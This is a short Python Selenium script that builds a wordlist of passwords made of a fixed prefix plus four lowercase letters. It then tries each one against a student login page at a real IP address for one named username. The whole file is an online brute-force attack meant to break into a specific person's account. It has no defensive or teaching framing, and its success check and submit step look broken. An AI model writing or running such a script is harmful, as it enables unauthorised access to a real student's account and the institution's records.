from selenium import webdriver 
from selenium.webdriver.common.keys import Keys
import time
passes = []
for i in range(0,26):
	for j in range(0, 26):
		for k in range(0,26):
			for l in range(0,26):
				password = "kar505"
				password = password + chr(ord("a")+i) + chr(ord("a")+j) + chr(ord("a")+k) + chr(ord("a") + l)
				passes.append(password + "\n")
with open('passewords.txt', "w") as f:
	f.write("".join(passes))
driver = webdriver.Chrome('./chromedriver')
driver.get("http://59.144.74.15/fb/recordlevel/studlogin.asp")
for p in passes:
	username  = driver.find_element_by_name("username")
	username.send_keys("16MI505")
	password  = driver.find_element_by_name("password")
	password.send_keys(p)
	enter = driver.find_element_by_name("submit")
	time.sleep(1.5)
	error = driver.find_element_by_class_name("ewmsg")
	if not error:
		print("Successfully found password", p)

driver.close()